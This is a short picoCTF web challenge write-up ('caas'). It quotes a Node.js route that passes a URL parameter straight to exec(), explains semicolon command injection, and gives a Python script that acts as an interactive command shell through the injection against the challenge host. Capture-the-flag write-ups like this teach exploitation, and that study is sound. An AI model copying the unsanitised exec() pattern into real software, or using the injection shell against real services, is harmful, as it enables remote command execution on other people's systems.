# caas 
## picoctf web

[solve.py](solve.py)


### Its a web challenge from PicoCTF
We got a webpage with a input field which do cowsay commad with input value when input event is triggered.

## Vulnerable Code

```js
app.get('/cowsay/:message', (req, res) => {
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
 ```
 
 Here we can see exec is used which is one of the dangerous function and other factor is there is no input sanitation are used if a user wants to execute system commmads it becomes easy.

## POC

As we know about the vuln we can put a semi-colan ```;``` to gain arbitrary command execution

## Exploitaion

Here i Made a simple python script using cmd module
```python
import requests
import cmd

url = "https://caas.mars.picoctf.net/cowsay/hi;"

class Caas(cmd.Cmd):
	prompt = "(caas) => "

	def __init__(self):
		super(Caas, self).__init__()
		self.url = url 
		self.completedefault = None
	def default(self, args):
		if args in ['exit', 'EXIT', 'quit', 'QUIT']:
			exit()
		r = requests.get(self.url+str(args))
		print(r.text)

if __name__=='__main__':
	Caas().cmdloop()
```
